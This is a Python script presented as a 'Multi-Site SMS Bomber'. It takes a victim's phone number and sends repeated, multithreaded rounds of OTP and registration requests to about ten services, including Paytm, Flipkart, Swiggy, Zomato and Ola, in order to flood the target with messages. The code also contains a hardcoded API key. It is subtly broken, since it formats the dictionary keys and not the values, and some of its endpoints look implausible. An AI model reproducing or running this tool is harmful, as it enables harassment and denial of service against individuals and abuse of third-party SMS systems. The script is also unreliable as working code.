import requests
import threading
import time
import random
from concurrent.futures import ThreadPoolExecutor
import urllib.parse

class MultiSMSBomber:
    def __init__(self):
        self.phone = ""
        self.sites = [
            # Free recharge sites
            {
                "name": "Freerecharge",
                "url": "https://freerechargeapi.in/app-api.php",
                "data": {
                    "auth_key": "264387732c6f3b",
                    "mobile": "{phone}",
                    "amount": "10",
                    "accept": "1"
                },
                "method": "POST",
                "headers": {"Content-Type": "application/x-www-form-urlencoded"}
            },
            {
                "name": "SMSLover",
                "url": "https://smshub.org/smshub/getsms",
                "data": {
                    "phone": "{phone}",
                    "service": "all"
                },
                "method": "POST"
            },
            {
                "name": "TextU",
                "url": "https://textnow.com/api/v3/register",
                "data": {
                    "phoneNumber": "{phone}"
                },
                "method": "POST",
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            {
                "name": "Paytm",
                "url": "https://accounts.paytm.com/otp",
                "data": {
                    "mobile": "{phone}",
                    "country": "91"
                },
                "method": "POST"
            },
            {
                "name": "Amazon",
                "url": "https://www.amazon.in/ap/signin",
                "data": {
                    "email": "{phone}@amazon.com",
                    "password": "test123"
                },
                "method": "POST"
            },
            {
                "name": "Flipkart",
                "url": "https://www.flipkart.com/api/6/user/otp/generate",
                "data": {
                    "loginId": "{phone}",
                    "countryCode": "+91"
                },
                "method": "POST"
            },
            {
                "name": "PhonePe",
                "url": "https://m.phonepe.com/v2/register",
                "data": {
                    "mobile": "{phone}"
                },
                "method": "POST"
            },
            {
                "name": "Swiggy",
                "url": "https://www.swiggy.com/dapi/auth/otp",
                "data": {
                    "mobile": "{phone}",
                    "country_code": "+91"
                },
                "method": "POST"
            },
            {
                "name": "Zomato",
                "url": "https://www.zomato.com/php/social_login.php",
                "data": {
                    "phone": "{phone}"
                },
                "method": "POST"
            },
            {
                "name": "Ola",
                "url": "https://accounts.olaapps.com/api/v1/users/otp",
                "data": {
                    "phone": "{phone}",
                    "country_code": "+91"
                },
                "method": "POST"
            }
        ]
    
    def format_phone(self, phone):
        """Clean and format phone number"""
        phone = ''.join(filter(str.isdigit, phone))
        if len(phone) == 10:
            phone = "91" + phone
        return phone
    
    def send_request(self, site):
        """Send single request to a site"""
        try:
            self.phone = self.format_phone(self.phone)
            
            url = site["url"].format(phone=self.phone)
            data = {k.format(phone=self.phone): v for k, v in site["data"].items()}
            
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                **site.get("headers", {})
            }
            
            if site["method"] == "POST":
                response = requests.post(url, data=data, headers=headers, timeout=10)
            else:
                response = requests.get(url, headers=headers, timeout=10)
            
            print(f"✅ [{site['name']}] Status: {response.status_code}")
            return True
            
        except Exception as e:
            print(f"❌ [{site['name']}] Error: {str(e)[:50]}")
            return False
    
    def bombard(self, phone, threads=10, rounds=3):
        """Main bombing function"""
        self.phone = phone
        print(f"🚀 Starting SMS bomb on: {self.phone}")
        print(f"📊 Threads: {threads} | Rounds: {rounds}")
        
        success_count = 0
        
        for round_num in range(rounds):
            print(f"\n🔄 Round {round_num + 1}/{rounds}")
            
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = [executor.submit(self.send_request, site) for site in self.sites]
                results = [future.result() for future in futures]
            
            round_success = sum(results)
            success_count += round_success
            print(f"📈 Round Success: {round_success}/{len(self.sites)}")
            time.sleep(2)  # Delay between rounds
        
        print(f"\n🎉 Total Success: {success_count}/{len(self.sites) * rounds}")
        print("✅ Bombing completed!")

def main():
    print("🔥 Multi-Site SMS Bomber")
    print("=" * 50)
    
    phone = input("📱 Enter phone number: ").strip()
    if not phone:
        print("❌ Invalid phone number!")
        return
    
    threads = int(input("⚙️ Enter thread count (default 10): ") or 10)
    rounds = int(input("🔄 Enter rounds (default 3): ") or 3)
    
    bomber = MultiSMSBomber()
    bomber.bombard(phone, threads, rounds)

if __name__ == "__main__":
    main()
